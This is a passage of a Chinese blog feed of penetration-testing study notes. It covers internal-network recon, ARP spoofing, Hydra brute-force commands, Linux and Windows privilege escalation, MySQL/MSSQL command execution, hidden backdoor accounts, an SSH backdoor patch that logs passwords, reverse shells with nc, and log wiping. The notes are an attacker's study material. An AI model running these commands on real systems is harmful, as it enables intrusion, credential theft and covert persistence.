      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试学习笔记29-内网渗透</title>
    <link href="prayer007007.github.io/2018/09/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B029-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <id>prayer007007.github.io/2018/09/11/渗透测试学习笔记29-内网渗透/</id>
    <published>2018-09-10T23:41:41.000Z</published>
    <updated>2018-09-10T15:42:19.390Z</updated>
    
    <content type="html"><![CDATA[<pre><code>1.信息搜集2.流量监听3.arp欺骗4.密码破解1.信息搜集nmapzenmapscanportntscanarp -anet view</code></pre><a id="more"></a>    <pre><code>收集信息:对本地主机收集本地账号信息软件账号密码系统账号密码:    管理员密码    pwdum7    getpass服务账号密码ftpsmb对网络主机收集    对外收集:(A,B,C类)C类一般为192.168    探测局域网中存活的主机.    nmap    nmap 192.168.0.1/24    protscan    cmd-&gt;    arp -a    cmd-&gt; net view    WIN+R    \\192.168.0.10\c$  xxx网文件共享    WIN+E ftp://2.流量监听    wiresharke     cain     snifferpass     嗅探欺骗-&gt;cain    关闭防火墙.    ncpa.cpl    没锁才可以    cain-&gt;打开旁边的&quot;网卡&quot;-&gt;Filters and ports-&gt;    确定之后,再点&quot;网卡&quot; -&gt;Sniffer:嗅探哪些主机    点击右侧-&gt;点击+-&gt;选择网关-&gt;192.168.3.105    开始测试抓包    点击password-&gt;HTTP-&gt;就可以抓到用户名密码了    Services-&gt;Telnet-&gt;需要先安装FTP服务    telnet 192.168.3.130    administrator 123456    ftp 192.168.3.130    administrator 123456    mstsc    监听密码:    3389    telnet    ftp    http    wiresharke :黑客网工都会用(有专门的两本书)    恶意流量,阻塞什么的.    services.msi    telnet-&gt;启动-&gt;手动应用    安装-&gt;打开-&gt;捕获-&gt;选项-&gt;选择接口    抓包    过滤数据包-&gt;过滤器点击-&gt;http-&gt;post包就能显示了    右击-&gt;追踪流    ip.src==192.168.3.130 &amp; ip.dst==139.129.3.10回车    dst:目标网站    telnet    右击-&gt;追踪TCP流    ftp    右击-&gt;追踪TCP流    cmd-&gt;exit/quit   是退出    文件共享:    smb(抓不到,只能抓明文)    右击-&gt;追踪TCP流    3.ARP嗅探    C段:24的掩码    嗅探欺骗-&gt;netFuke    双向欺骗:服务器跟网关    单向欺骗:服务器    设置-&gt;嗅探设置    设置-&gt;ARP欺骗    紫色的点左侧的按钮-&gt;修改器-&gt;注入代码    先安装.Net    再安装Evil Foca        特点:不同的网络也能探测出来    DNS Hijacking    Domain www.baidu.com    ip 192.168.3.14.密码爆破    hydra    参数详解:    -R 根据上一次进度继续破解    -S 使用SSL协议连接    -s 指定端口    -l 指定用户名    -L 指定用户名字典(文件)    -p 指定密码破解    -P 指定密码字典(文件)    -e 空密码cancel和指定用户密码探测(dns)    -C 用户名可以用:分割(username:password)可以代替-l username -p password    -o 输出文件    -t 指定多线程数量,默认为16个线程    -vV xianshi详细过程    server 目标ip    service 指定服务名(telnet ftp pop3 mssql mysql ssh ssh2...)    使用案例:    使用hydra破解ssh密码    hydra -L users.txt -P password.txt -vV -o ssh.log -e ns IP ssh    破解smb:    # hydra -l administrator -P pass.txt IP smb    破解rdp:    #hydra IP rdp -l administrator -P pass.txt -V    破解telnet    # hydra IP telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V    破解ftp:    # hydra ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV    # hydra ftp -l 用户名 -P 密码字典 -e ns -vV    破解cisco:    # hydra -P pass.txt IP cisco    # hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable爆破常见的服务:smbtelnetftp3389mssqlmysql使用案例破解Sqlserver密码hydra.exe -l sa -p c:pass.txt 192.168.2.3 mssql破解Mysql密码hydra.exe -l root -p c:\pass.txt 192.168.2.3 mysql离线爆破:在线爆破:kali密码攻击-&gt;hydra-&gt;            加载字典是大写P    ip后面要跟服务名GPU+线程高+内存高爆破才行</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;1.信息搜集
2.流量监听
3.arp欺骗
4.密码破解


1.信息搜集
nmap
zenmap
scanport
ntscan
arp -a
net view
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
    
      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
    
      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试学习笔记28-后渗透攻击02</title>
    <link href="prayer007007.github.io/2018/09/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B028-%E5%90%8E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB02/"/>
    <id>prayer007007.github.io/2018/09/11/渗透测试学习笔记28-后渗透攻击02/</id>
    <published>2018-09-10T23:40:23.000Z</published>
    <updated>2018-09-10T15:41:15.197Z</updated>
    
    <content type="html"><![CDATA[<pre><code>爬图片的链接,爬图片所在的目录,通过上传的目录就能判断出来用的什么编辑器reg:uploadfile/201703133235.jpg -&gt;这个格式就是ewebusr/image/ --&gt;fck一般编辑器就是在ewebxxx目录下 ,找到editor目录综合利用:    数据挖掘    vpn搭建    源码打包    黑客脱裤</code></pre><a id="more"></a>        <pre><code>挖掘有用的信息: 数据库数据文件相关账号可利用的软件获取管理员密码上传权限提升-&gt;getpass找mysql目录,data,user.MYD可以翻查用户桌面查找敏感文件My Documentsvpn搭建:vpn是虚拟专用链路通道通过账号登录vpn服务器,通过vpn的ip来访问目标主机工具搭:reg:openvpn需要有网卡VM-&gt;添加网络适配器-&gt;开始-&gt;管理您的服务器-&gt;远程访问VPN-&gt;选一个外网ip-&gt;手动指定范围192.168.2.100-192.168.2.200,即连接后获取一个内网ip来与内网进行通信企业搭vpn,供管理员出差时可以进入到内网中进行访问,然后访问的话,用服务端外网路由端口访问管理-&gt;...-&gt;允许拨入网络-&gt;新建-&gt;VPN-&gt;ip肉鸡ip-&gt;user,pw(需要验证肉鸡用户名,密码)Linux搭建vpn:http://www.vkilo.com/install-pptp-vpn-rhel-linux.html# ping www.baidu.comifconfig/*yum list pptpd/yum install pptpd或者手动下载cd /usr/local/src#For 32bit oswget http://poptop.sourceforge.net/yum/stable/packages/pptpd-1.4.0-1.el6.i686.rpmrmp -dhv pptpd-1.4.0-1.el6.i686.rpm*/#rpm -ivh http://poptop.sourceforge.net/yum/stable/packages/pptpd-1.4.0-1.el6.i686.rpm   //直接在远程端进行下载/*安装完成后,配置pptp vpnvim /etc/pptpd.conf执行到39行,在其前面加#注释掉#logwtmp:localip 192.168.0.1  //本地ipremoteip 192.168.0.234-238,192.168.0.245  //给客户端分发的网段*/# vi /etc/pptpd.conf找localip,remoteip,上下两个用哪个都可以  ,然后可以自己手动设置编辑/etc/ppp/chap-secrets   //主要为了添加一个vpn连接的用户信息# vi /etc/ppp/chap-secretsuser1    pptpd   123123   *   //ip如果写*的h话,就是允许所有ip进行访问# vi /etc/ppp/options.pptpd把ms-dns修改为 ms-dns 8.8.8.8  ms-dns 4.2.2.2把debug打开,即取消掉注释把路由转发启用# vi /etc/sysctl.conf将net.ipv4.ip_forward=0  改为1   0代表不转发,1代表转发# sysctl -p   //生成策略防火墙配置:#请选择显示为外网ip的网卡iptables -A INPUT -i eth1 -p tcp --dport 1723 -j ACCEPTiptables -A INPUT -i eth1 -p gre -j ACCEPTiptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE#保存防火墙设置并重启防火墙service iptables saveservice iptables restart或者直接将防火墙关闭iptables -Fservice pptpd start#可以设置开机启动pptpdchkconfig pptpd on#选做tail -f /var/log/messages然后就可以连接linux了源码打包jsp的话一般用war打包也是可以的,不用上传打包马asp就直接asp大马大马-&gt;服务器打包-&gt;一般是根目录打包-&gt;会生成HSH.mdb文件然后下载就可以访问下载了下载之后,建一个文件夹,里面一个小旋风,一个大马,一个mdb然后大马-&gt;服务器打包-&gt;解包-&gt;然后源代码到手php脱裤:打包马-&gt;phpmyzip-&gt;指定路径-&gt;压缩-&gt;然后在指定路径生成一个文件  ,如果超过自身能力的话,大马会自杀..jsp打包:java war打包winrar   cmd-&gt;C:&gt;cd myHomeC:/myHome/&gt;jar cvf myhome.war */.jar cvf[A=&gt;&gt; war包名].war[B=&gt;&gt; 资源文件或文件夹][C=&gt;&gt; 将要生成war包的目标文件夹]&quot;*/&quot; (B=&gt;&gt; )代表当前目录(C:/myHome)下的所有文件及文件夹&quot;.&quot; (C=&gt;&gt; )表明将要在当前目录中生成war包jar cvf 生成路径/xx.war 要打包的路径/.解包tomcat黑客脱裤:sqlserver:有注入就用sqlmap去拖没有注入就上传木马拖,权限提升-&gt;脱裤马webshell-&gt;脚本木马大全大马-&gt;select * from 表名菜刀-&gt;连接上-&gt;右键数据库管理脱裤数据管理-&gt;sqltools-&gt;远程拖,要开到外链才能连接Navicat Premium-&gt;右键新建链接-&gt;(也需要外接)xxx 192.168.3.102  , sa 123456mysql跟sqlserver基本一样的数据管理-&gt;脱裤马-&gt;mysql-&gt;admin.php 这个大马可以操作很多种数据库</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;爬图片的链接,爬图片所在的目录,通过上传的目录就能判断出来用的什么编辑器
reg:uploadfile/201703133235.jpg -&amp;gt;这个格式就是eweb
usr/image/ --&amp;gt;fck
一般编辑器就是在ewebxxx目录下 ,找到editor目录


综合利用:
    数据挖掘
    vpn搭建
    源码打包
    黑客脱裤
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
    
      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
    
      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试学习笔记27-后渗透攻击</title>
    <link href="prayer007007.github.io/2018/09/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B027-%E5%90%8E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB/"/>
    <id>prayer007007.github.io/2018/09/11/渗透测试学习笔记27-后渗透攻击/</id>
    <published>2018-09-10T23:39:18.000Z</published>
    <updated>2018-09-10T15:39:46.421Z</updated>
    
    <content type="html"><![CDATA[<pre><code>Linux提权:内核溢出提权mysql udf提权利用SUID提权利用环境变量劫持高权限程序提权内核溢出提权查看内核 uname -r反弹shell执行命令上传exp编译执行根据内核版本查找对应漏洞收集exp可以从www.exploit-db.com查找漏洞利用</code></pre><a id="more"></a>    <pre><code>rhel linux先上传一个大马#ifconfig#iptables -F#setenforce 0大马-&gt;执行命令uname -r 查看内核版本号权限提升-&gt;linuxEXP-&gt;mempodipper2.6.39.c大马-&gt;文件管理-&gt;上传需要移动到tmp目录下,才能有权限 mempodipper2.6.39.c-&gt;改名a.c大马-&gt;(#)cp /var/www/html/a.c /tmp/a.cls /tmp大马-&gt;Linux提权-&gt;反弹端口本机nc -l -n -v -p 12345侦听本机-&gt;ls /tmpwhoami   是apache权限,比较小cd /tmpgcc a.c (默认生成一个a.out)ls -l  查看是否有权限chmod 777 a.out   对其附加权限./a.out   执行进行提权whoami 回车 如果卡住的话,说明利用失败mysql UDF提权上传库文件执行库文件创建命令执行函数cracer官网去查看要有一个udf.txt大马-&gt;MYSQL提权-&gt;user/pw-&gt;复制32位的udf.txt代码-&gt;①(执行)(没有权限)# chmod 777 -R /usr/lib/mysql/plugin 设置权限再执行①,就有权限执行了select sys_eval(&apos;cat /etc/passwd&apos;);漏洞利用-&gt;mysql提权工具-&gt;指定ip,外连测试数据管理-&gt;开启root外链-&gt;第一条代码复制大马-&gt;MYSQL-&gt;复制,执行成功后,就能外连了mysql提权工具-&gt;udf提权利用SUID提权寻找系统里可以用的SUID文件来提权$find / -perm -u=s -type f 2&gt;/dev/null大马-&gt;执行命令-&gt;复制,$去掉SUID是设置用户id,查看哪些文件是有SUID的,某些文件普通用户可以临时具有管理员权限.我们发现nmap居然有SUID标志位,来看看nmap版本nmap支持&quot;interactive&quot;选项,用户能够通过该选项执行shell命令,通常,安全人员会使用该命令来避免他们使用nmap命令被记录在history文件中#nmap --interactive因为nmap有SUID位,所以通过&quot;!sh&quot;我们会获取到一个root权限的shell#nmap&gt; !shSUID普通用户也会有权限对其控制,相当于拥有root权限-&gt;开一个执行命令的窗口利用环境变量劫持高权限程序提权第一步:查找可操作文件$find/ -perm -u=s -type f 2&gt;/dev/null第二步:利用file命令查看文件是否可执行执行该文件在执行的时候可能会报错,根据报错来查看调用系统命令利用低权限用户目录下可被root权限用户调用的脚本提权设置bash的$path环境变量然而当我们调用cat命令的时候,cat会从以上目录来寻找,如果我们添加.到$PATH环境变量,则会先从当前目录来寻找cat指令.新建cat,添加执行权限这样当我们再次运行./msgmike命令的时候,就会触发当前目录下的cat(/bin/sh),从而提权.$ lslsmsgmike$ file msgmike$ ./msgmike./msgmikecat: .....No such file or directory$ touch cattouch cat$ echo &quot;/bin/sh&quot; &gt; catecho &quot;/bin/sh&quot; &gt; cat$ export PATH=&quot;.&quot;$ msgmikereg:大马-&gt;执行命令-&gt;export PATH=&quot;.&quot;大马-&gt;执行命令-&gt;echo &quot;/bin/bash&quot;&gt; ping   创建一个bean后渗透攻击维持访问记录清除综合利用维持访问:创建后门账号安装后门程序安装远控程序安装Linux后门Windows怎么创建后门?答:net user cc 123.com /addnet localgroup administrator cc /addnet user ccnet user guest /active:yesnet user guest 123.comnet localgroup administrator guest /add建议用SUPPORT_338945a0先登录进去,再创建隐藏账号,然后在删掉之前的就可以了右键-&gt;我的电脑-&gt;管理-&gt;用户-&gt;右击3389-&gt;设置密码属性-&gt;拨入-&gt;允许访问regedit-&gt;SAM-&gt;右击属性-&gt;添加EveryoneSAM-&gt;Domains-&gt;Account-&gt;Users-&gt;Names-&gt;找到对应的号,然后打开管理员那个而不是自己创建的那个-&gt;打开F-&gt;复制16进制数,找到自己创建的号的F,然后粘贴然后虽然显示的是未连接,但是却可以远程连接这个账户了.超级隐藏后门-&gt;权限提升-&gt;超级隐藏后门安装后门用权限提升-&gt;sethc按5次shift就可以***比较危险,容易全盘感染,杀毒软件都不管用根据热键表 设置热键 reg:65,68起名叫lpklpk文件一般都是会调用的,首先调用同一级别目录的lpk5次shift,再按热键,输入密码-&gt;可以调用cmd命令whoami安装远程控制:权限提升-&gt;sx(上兴,类似灰鸽子,大灰狼)-&gt;打开-&gt;地址要外网地址,是返回来连接攻击端的端口-&gt;生成,可以改名为qq.exe内网的话,就端口转发有个键盘记录. 可以监听安装Linux后门:Linux,权限提升-&gt;linux后门工具上传上去tar zxvf openssh-5.9p1.tar.gztar zxvf 0x06-openssh-5.9p1.patch.tar.gzcd openssh-5.9p1.patch/cp sshbd5.9.p1.diff ../openssh-5.9p1cd ../openssh-5.9p1patch &lt;sshbd5.9p1.diff //patch 后门vi includes.h //修改后门密码,记录文件位置/*+#define ILOG &quot;/tmp/ilog&quot;  //记录登良路到本机的用户名和密码+#define OLOG &quot;/tmp/olog&quot;  //记录本机登录到远程的用户名和密码+#define SECRETPW &quot;123456&quot; //你后门的密码*/# ssh -vvi version.h  //修改ssh版本信息,改成原来的,防止用户登录的时候察觉到先安装所需环境不然会报错yum install -y openssl openssl-devel pan devel./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5  //通过源代码的安装,配置安装编译前的环境配置,源代码安装经常会报错注意要是出现:configure:error:***zlib.h missing - please install first or check config.log需要安装zlibyum install -y zlib zlib -develhttp://sourceforge.net/projects/libpng/files/zlib/1.2.3/zlib-1.2.3.tar.gz/download需要make cleanmake &amp;&amp; make install //写一个就行service sshd restart  //重启sshd然后我们登录ssh看看cd -vi includes.h:wqcat /tmp/ilog  //记录别人登录我ssh 192.168.3.112yes123456exitcat /tmp/olog //记录我登录的别人记录清除windows系统记录清除Linux系统记录清除扫描网站目录,会记录在哪里?答:记录在网站日志文件中虚拟主机:htdoc,loglog记录网站访问日志,需要擦除相关日志正常网站的话,reg:iis 百度:网站访问日志.进行分析-&gt;如果不严重的话,在这个日志找不到你就会算了.但是如果很严重的话,怎么删都不行.服务端电脑-&gt;管理-&gt;事件查看器-&gt;安全性-&gt;清记录一般是: 日志+文件修改时间+权限 来进行判断的数据恢复的也可以看到Linux怎么查呢?答:ls /var/log/httpd/cat /var/log/httpd/access_logls -l /var/www/html/   //查看网站的上传日期touch *  //将文件更新到最新history  //查看执行指令命令history -c  //清除指令命令</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;Linux提权:
内核溢出提权
mysql udf提权
利用SUID提权
利用环境变量劫持高权限程序提权


内核溢出提权
查看内核 uname -r
反弹shell执行命令
上传exp
编译
执行
根据内核版本查找对应漏洞
收集exp
可以从www.exploit-db.com查找漏洞利用
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
    
      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
    
      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试学习笔记26-权限下</title>
    <link href="prayer007007.github.io/2018/09/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B026-%E6%9D%83%E9%99%90%E4%B8%8B/"/>
    <id>prayer007007.github.io/2018/09/11/渗透测试学习笔记26-权限下/</id>
    <published>2018-09-10T23:37:58.000Z</published>
    <updated>2018-09-10T15:38:39.341Z</updated>
    
    <content type="html"><![CDATA[<pre><code>远程管理软件提权pcanywhere访问pcanywhere默认安装目录下载用户配置文件通过破解账户密码文件大马-&gt;pcanywhere-&gt;host/remotes-&gt;PCA admin CIF(远程登录用户的配置文件)-&gt;下载,并破解权限提升-&gt;第三方工具提权-&gt;pcanywhere提权-&gt;进行破解攻击端也要安装一个pcanywhere,添加下一步-&gt;连接的ip指定一下,勾选连接被控端radmin提权通过端口扫描 扫描4899端口上传radmin.asp木马读取radmin的加密密文使用工具连接</code></pre><a id="more"></a>    <pre><code>Radmin设置安装服务,设置口令-&gt;启动regedit-&gt;RAdmin大马-&gt;RAdmin第三方提权工具-&gt;Radmin-&gt;输入ip-&gt;输入大马得出的hash值大小写转为小写vnc提权通过读取注册表十进制数将得出的十进制数去掉第一个数,其他的转换成十六进制数破解十六进制数得到密码vncx4.exe -W 回车输入转换后的十六进制数连接vncRealVNC启动大马-&gt;读取注册表-&gt;VNC4密码未有权限读的话,需要将权限提升第三方软件提权-&gt;VNC4.exevncx4.exe-&gt;vncx4.exe -W输入(大马读取的数并转成16进制)-&gt;即:一个一个输入,要一个一个回车-&gt;输入完后自动出密码溢出提权主要是通过windows漏洞利用来获取系统权限常见的溢出提权巴西烤肉pr步骤:1.通过信息收集查看服务器打了哪些补丁2.根据未打补丁漏洞进行利用即可systeminfo-&gt;查看补丁-&gt;K8补丁对比工具-&gt;溢出提权,里面基本都是exe先上传大马-&gt;上传文件-&gt;找一个可读可写的目录pr.exe-&gt;cmd执行一下漏洞路径url &quot;whoami&quot;不用pr,就是一个网络服务权限,用pr是system权限破解hash提权上传pwdump.exe运行获取hash值拿到Ic5,彩虹表中破解即可得到管理员密码需要管理员权限方可执行读取hash操作权限提升-&gt;getpass-&gt;getpass可以直接读取明文密码权限提升-&gt;getpass-&gt;pwd-&gt;PwDump7.exe和libeay32.dll移到服务端pwdump7.exe,没有权限是没有任何效果的 (可以用刚刚的pr来执行)pr.exe &quot;pwdump7.exe&quot;破解第一行的最后一段16进制数就是密码getpass-&gt;GetPass_cmd.exe/新建文件夹\pass.exe-&gt;读取明文启动项提权前提写入的目录需要写入权限将批处理文件上传到开机启动项目录等待管理员重启即可数据库提权sqlserver数据库提权MySQL数据库提权需要具备数据库管理员权限才可执行提权操作mssql提权安装组件开启3389创建用户提升权限完成sa账号的获取,去查看config.asp,conn.asp等文件web.configmssql安装执行命令组件安装cmd_shell组件EXEC sp_configure &apos;show advanced options&apos;,1  GORECONFIGUREGOEXEC sp_configure &apos;xp_cmdshell&apos;,1GORECONFIGUREGO数据管理-&gt;K8MSSQL/sqltoos/MSSQL查询分析器执行命令 net user/whoami删除cmd_shell组件EXEC sp_configure &apos;show advanced options&apos;,1GORCONFIGUREGOEXEC sp_configure &apos;xp_cmdshell&apos;,0GORECONFIGUREGO3389操作语句开启3389execmaster.dbo.xp_regwrite&apos;HKEY_LOCAL_MACHINE&apos;,&apos;SYSTEM\CurrentControlSet\Control\Terminal Server&apos;,&apos;fDenyTSConnections&apos;,&apos;REG_DWORD&apos;,0;--关闭3389execmaster.dbo.xp_regwrite&apos;HKEY_LOCAL_MACHINE&apos;,&apos;SYSTEM\CurrentControlSet\Control\Terminal Server&apos;,&apos;fDenyTSConnections&apos;,&apos;REG_DWORD&apos;,1;开启3389,之后就可以mstsc了如果不能外连的话,只能是上传木马大马-&gt;SQL-SA-&gt;user/pw-&gt;执行命令就行了Mysql数据库提权udf提权启动项提权mof提权反连端口提权udf提权获取到对方的mysql数据库下的root账号密码1.查看网站源码里面数据库配置文件(inc,conn,config,sql,common,data等)2.查看数据库安装路径下的user.myd(/data/mysql/)3.暴力破解mysql密码破解3306端口入侵udf提权原理:通过root权限导出udf.dll到系统目录下,可以通过udf.dll调用执行cmdC:\Winnt\udf.dll 2000C:\Windows\udf.dll 2003现在基本上win的服务器就这两个导出UDF.DLL5.1以上版本需要导出mysql安装目录lib\plugin\create function cmdshell returns string soname &apos;udf.dll&apos;select cmdshell(&apos;net user cracer cracer /add&apos;);select cmdshell(&apos;net localgroup administrators cracer /add&apos;);drop function cmdshell;删除函数权限提升-&gt;数据库提权-&gt;Mysql/mysql提权访问这个php root/rootcreate plugindump udfcreate function另外一款免杀的php,可以执行select sys_eval(&apos;whoami&apos;)启动项提权1.查看我们进入数据库中有些什么数据表mysql&gt;show tables;默认的情况下,test中没有任何表的存在.以下为关键的部分2.在TEST数据库下创建一个新的表;mysql&gt;create table a (cmd text);好了,我们创建一个新的表,名为a,表中只存放一个字段,字段名为cmd,为text文本3.在表中插入内容mysql&gt;insert into a values(&quot;set wshshell=createobject(&quot;&quot;wscript.shell&quot;&quot;)&quot;);mysql&gt;insert into a values(&quot;a=wsshell.run(&quot;&quot;cmd.exe /c net user 1 1 /add&quot;&quot;,0)&quot;);mysql&gt;insert into a values(&quot;a=wsshell.run(&quot;&quot;cmd.exe /c net localgroup Administrators 1 /add&quot;&quot;,0)&quot;);注意双引号和括号以及后面的&quot;0&quot;一定要输入!我们将用这三条命令来建立一个VBS的脚本程序.4.表a中应该有3条数据mysql&gt;select * from a我们将会看到表中有三行数据,确认输入无误后,下一步5.输出表为一个VBS的脚本文件mysql&gt;select * from a into outfile &quot;c://docume~1//administrator//[开始]菜单//程序//启动//a.vbs&quot;;6.重启即可!mof提权第一种方法:上传mof.php输入相关信息,执行命令,提权第二种方法:上传文件x.mof使用select命令导出入到正确位置select load_file(&apos;C:/wmpub/nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullect.mof&apos;允许外部地址使用root用户连接的sql语句Grant all privileges on *.* to &apos;root&apos;@&apos;%&apos; identified b &apos;root&apos; with grant option;访问mof.php  先Exploit 才能执行命令php-&gt;大马-&gt;nosafe/test/testa访问登录后就可以执行sql语句了,要有权限才能执行更多反链端口提权利用mysql客户端工具连接mysql服务器,然后执行下面的操作执行命令mysql.exe -h 172.16.10.11 -uroot -pEnter password:mysql&gt;\.c:\mysql.txtmysql&gt;select backshell(&quot;YourIP&quot;,2010);2.本地监听你反弹的端口nc.exe -vv -l -p 2010成功后,你将获得一个system权限的cmdshell,其实这个也是利用的UDF提权服务器端反连接黑客端,然后开另一个端口来进行监听,就可以对服务器端进行操作了udf-&gt;创建反弹函数-&gt;执行反弹select backshell(&apos;本机ip&apos;,端口12345)权限提升-&gt;端口转发-&gt;nc.rarnc.exenc -l -p 12345如果有防火墙的时候可以使用反弹防火墙会拦截外网,一般不会拦截内网内网端口转发内网主机输入命令:lcx.exe -slave 外网ip 外网端口 内网ip 内网端口lcx.exe -slave 192.168.0.104 1111 127.0.0.1 3389外网主机输入命令lcx.exe -listen 1111 1311外网要路由器的端口映射到内网的某台电脑上DMZ主机一般比较安全虚拟服务器,xx端口,会给x.x.x.x的ip映射一定要连接内网某一端口的话,需要端口转发大马-&gt;执行cmd-&gt;那个有 -tran的那个执行上方命令权限提升-&gt;端口转发-&gt;lcxcmd-&gt;lcx.exe -listen 1111 1311mstsc127.0.0.1:1311开启3389使用批处理文件开3389使用sql语句开3389使用exe开3389使用vb开3389一些命令利用type E:\wwwroot\Web.config 查看文件内容cacls命令/T:更改当前目录及其所有子目录中指定文件的ACL/E:编辑ACL而不替换/C:在出现拒绝访问错误时继续/G Userer:perm:赋予指定用户访问权限,Perm代表不同级别的访问权限,其值可以是R(读取),w(写入),c(更改,写入),F(完全控制)等./R user:撤销指定用户的访问权限,注意该参数仅在与&quot;/E&quot;一起使用时有效cacls C:\wwwroot\1.htm /t /e /c /g interactive:f 要修改一个文件的权限的必要条件 要有USERS组的完全控制权限 CMD权限</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;远程管理软件提权

pcanywhere
访问pcanywhere默认安装目录
下载用户配置文件
通过破解账户密码文件

